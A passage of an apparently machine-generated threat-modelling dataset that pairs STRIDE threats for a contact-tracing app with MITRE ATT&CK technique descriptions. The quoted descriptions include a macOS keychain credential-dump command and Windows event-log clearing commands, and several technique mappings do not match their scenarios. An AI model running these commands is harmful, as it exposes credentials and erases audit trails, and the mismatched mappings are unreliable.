                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities neglected or unknown."
                },
                {
                    "Assumption": "Unauthorized users can connect to the database.",
                    "Role": "Attacker",
                    "Condition": "Network controls are insufficient."
                }
            ],
            "Potential Impact": "Unauthorized access and potential leakage of sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database access",
                "access control",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware installed on user devices extracts and transmits sensitive contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack comprehensive malware protection.",
                    "Role": "End User",
                    "Condition": "No antivirus or anti-malware software installed."
                },
                {
                    "Assumption": "Malware can access and exfiltrate data.",
                    "Role": "Attacker",
                    "Condition": "Malware with data exfiltration capabilities is deployed."
                },
                {
                    "Assumption": "User interacts with malicious content.",
                    "Role": "End User",
                    "Condition": "User falls for phishing or other attack vectors."
                }
            ],
            "Potential Impact": "Unauthorized access and extraction of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "data exfiltration",
                "endpoint security"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack against the central server disrupts application functionality.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks robust DDoS protection.",
                    "Role": "System Architect",
                    "Condition": "Insufficient DDoS mitigation measures."
                },
                {
                    "Assumption": "Attacker has access to a botnet.",
                    "Role": "Attacker",
                    "Condition": "Control of numerous compromised devices."
                },
                {
                    "Assumption": "High volume of traffic overwhelms the server.",
                    "Role": "Attacker",
                    "Condition": "Traffic exceeds server handling capacity."
                }
            ],
            "Potential Impact": "Disruption of service, impacting availability of contact tracing functions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ddos attack",
                "network traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious user repeatedly uploads large amounts of data to overwhelm server resources.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting on uploads.",
                    "Role": "System Architect",
                    "Condition": "Upload processes lack rate limits."
                },
                {
                    "Assumption": "Server resources are finite and can be exhausted.",
                    "Role": "System Architect",
                    "Condition": "Limited server capacity."
                },
                {
                    "Assumption": "User registration is not strictly controlled.",
                    "Role": "System Architect",
                    "Condition": "Lax user registration protocols."
                }
            ],
            "Potential Impact": "Service degradation or complete outage, impacting application availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "service disruption",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Application crash induced by malformed data packets sent by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Application does not validate incoming data properly.",
                    "Role": "System Architect",
                    "Condition": "Lack of thorough input validation."
                },
                {
                    "Assumption": "Malicious packets can reach the application.",
                    "Role": "Attacker",
                    "Condition": "Network controls allow malicious traffic."
                },
                {
                    "Assumption": "Application handling of data can lead to crashes.",
                    "Role": "System Architect",
                    "Condition": "Vulnerable code that mishandles unexpected inputs."
                }
            ],
            "Potential Impact": "Temporary or prolonged application unavailability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data packet",
                "input validation",
                "application crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits a vulnerability to gain administrative access to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Server software vulnerabilities are present.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or unknown vulnerabilities."
                },
                {
                    "Assumption": "Exploit code is available or can be developed.",
                    "Role": "Attacker",
                    "Condition": "Access to necessary resources."
                },
                {
                    "Assumption": "An initial foothold on the server is achieved.",
                    "Role": "Attacker",
                    "Condition": "Attacker successfully breaches initial defenses."
                }
            ],
            "Potential Impact": "Unauthorized administrative control and potential data tampering or exfiltration.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploit",
                "server vulnerability",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "User gains higher privileges on their own device through privilege escalation attack.",
            "Assumptions": [
                {
                    "Assumption": "Device OS has privilege escalation vulnerabilities.",
                    "Role": "End User",
                    "Condition": "Using outdated or vulnerable OS versions."
                },
                {
                    "Assumption": "Malware is deployed to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Malicious code capable of privilege escalation is available."
                },
                {
                    "Assumption": "User device lacks adequate security controls.",
                    "Role": "End User",
                    "Condition": "Device is not secured with anti-malware tools."
                }
            ],
            "Potential Impact": "Gaining unauthorized control, allowing tampering with stored data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "device vulnerability",
                "local control"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insider leverages legitimate access to escalate privileges and perform unauthorized actions on the server.",
            "Assumptions": [
                {
                    "Assumption": "Insider has some level of initial access.",
                    "Role": "Insider",
                    "Condition": "Granted necessary access for role."
                },
                {
                    "Assumption": "Privilege escalation paths are not fully secured.",
                    "Role": "System Architect",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Monitoring of privileged actions is insufficient.",
                    "Role": "System Architect",
                    "Condition": "Lack of strict auditing and monitoring."
                }
            ],
            "Potential Impact": "Unauthorized actions and potential data manipulation or exfiltration.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "privilege escalation",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake contact tracing app to lure users and collect their personal information.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized access to personal data, potential exposure of users' sensitive information, disruption of legitimate contact tracing efforts.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fake app",
                "phishing",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the Bluetooth ID of a user who has tested positive, tricking the app into sending false exposure alerts to others.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized alert notifications, causing unnecessary panic and potential misuse of medical resources.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "Bluetooth",
                "false alerts",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a spoofed server to pretend to be the central server in a centralized architecture, intercepting data sent from user devices.",
            "Assumptions": [],
            "Potential Impact": "Unauthorized access to users' sensitive data, potential for data manipulation and loss.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "server spoofing",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Phishing for Information",
                "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)",
                "id": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
                "technique_id": "T1598"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies the data being sent from the user device to the central server.",
            "Assumptions": [],
            "Potential Impact": "Data manipulation leading to inaccurate contact tracing results, potential undermining trust in the system.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "man-in-the-middle",
                "tampering",
                "modification"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to a user's device and changes the application data.",
            "Assumptions": [],
            "Potential Impact": "Corruption of application data, making the app unreliable for contact tracing.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "local tampering",
                "data corruption",
                "application data"
            ],
            "mitre_technique": {
                "name": "Keychain",
                "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",
                "id": "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3",
                "technique_id": "T1555.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the log files on the server to hide traces of unauthorized activity.",
            "Assumptions": [],
            "Potential Impact": "Compromised log integrity, difficulty in detecting and investigating security incidents.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "log files",
                "data integrity",
                "detection evasion"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having consented to share their contact data with the central server, claiming it is a privacy violation.",
            "Assumptions": [],
            "Potential Impact": "Legal disputes and loss of user trust, potential for loss of valuable contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user consent",
                "privacy",
                "legal"
            ],
            "mitre_technique": {
                "name": "TCC Manipulation",
                "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to execute malicious applications with elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)\n\nAdversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content. This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions. \n\nFor example, adversaries can use Finder, which has FDA permissions by default, to execute malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) while preventing a user prompt. For a system without System Integrity Protection (SIP) enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)\n\nAdversaries may also opt to instead inject code (e.g., [Process Injection](https://attack.mitre.org/techniques/T1055)) into targeted applications with the desired TCC permissions.\n",
                "id": "attack-pattern--e8a0a025-3601-4755-abfb-8d08283329fb",
                "technique_id": "T1548.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A healthcare worker denies having notified the server of a positive COVID-19 test, questioning the integrity of the notification system.",
            "Assumptions": [],
            "Potential Impact": "Disruption in timely notification of exposures, potential spread of the virus due to lack of timely alerts.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notification system",
                "data integrity",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims that the app did not notify them of an exposure, even though their data shows otherwise.",
            "Assumptions": [],
            "Potential Impact": "Disruption in trust towards the app, questioning reliability of exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "exposure notification",
                "trust",
                "reliability"
            ],
            "mitre_technique": {
                "name": "Trust Modification",
